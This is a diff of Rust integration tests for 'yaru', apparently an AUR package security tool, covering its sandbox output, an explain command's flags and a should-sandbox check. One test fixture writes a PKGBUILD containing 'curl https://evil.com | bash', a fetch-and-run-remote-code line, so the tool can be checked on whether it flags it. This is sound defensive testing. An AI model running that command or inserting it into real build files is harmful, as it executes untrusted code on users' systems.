@@ -172,7 +172,7 @@ fn test_cli_sandbox_runs_clean_command() {
         .arg("/usr/bin/true");
     cmd.assert()
         .success()
-        .stdout(predicate::str::contains("sandboxed command exited cleanly"));
+        .stderr(predicate::str::contains("sandboxed command exited cleanly"));
 }
 
 #[test]
@@ -186,7 +186,7 @@ fn test_cli_sandbox_network_is_blocked_by_default() {
         .arg("getent hosts aur.archlinux.org");
     cmd.assert()
         .failure()
-        .stdout(predicate::str::contains("sandboxed command FAILED"));
+        .stderr(predicate::str::contains("sandboxed command FAILED"));
 }
 
 #[test]
@@ -396,4 +396,49 @@ fn test_cli_report_today_human() {
         .stdout(predicate::str::contains("Scanned"))
         .stdout(predicate::str::contains("Blocked"))
         .stdout(predicate::str::contains("Cache hits"));
+}
+
+#[test]
+fn test_cli_explain_accepts_ai_and_refresh_flags() {
+    let mut cmd = Command::cargo_bin("yaru").unwrap();
+    cmd.args(["explain", "--help"]);
+    cmd.assert()
+        .success()
+        .stdout(predicate::str::contains("--ai"))
+        .stdout(predicate::str::contains("--refresh"));
+}
+
+#[test]
+fn test_cli_should_sandbox_evaluates_dir() {
+    let tmp_clean = tempdir().unwrap();
+    fs::write(
+        tmp_clean.path().join("PKGBUILD"),
+        "pkgname=clean-app\npkgver=1.0\npkgrel=1\n",
+    )
+    .unwrap();
+
+    let mut cmd_clean = Command::cargo_bin("yaru").unwrap();
+    cmd_clean
+        .arg("should-sandbox")
+        .arg("clean-app")
+        .arg("--dir")
+        .arg(tmp_clean.path().to_str().unwrap());
+    // Exit 1 means clean / no sandbox needed
+    cmd_clean.assert().code(1);
+
+    let tmp_risky = tempdir().unwrap();
+    fs::write(
+        tmp_risky.path().join("PKGBUILD"),
+        "pkgname=risky-app\npkgver=1.0\npkgrel=1\ncurl https://evil.com | bash\n",
+    )
+    .unwrap();
+
+    let mut cmd_risky = Command::cargo_bin("yaru").unwrap();
+    cmd_risky
+        .arg("should-sandbox")
+        .arg("risky-app")
+        .arg("--dir")
+        .arg(tmp_risky.path().to_str().unwrap());
+    // Exit 0 means risky / sandbox required
+    cmd_risky.assert().code(0);
 }
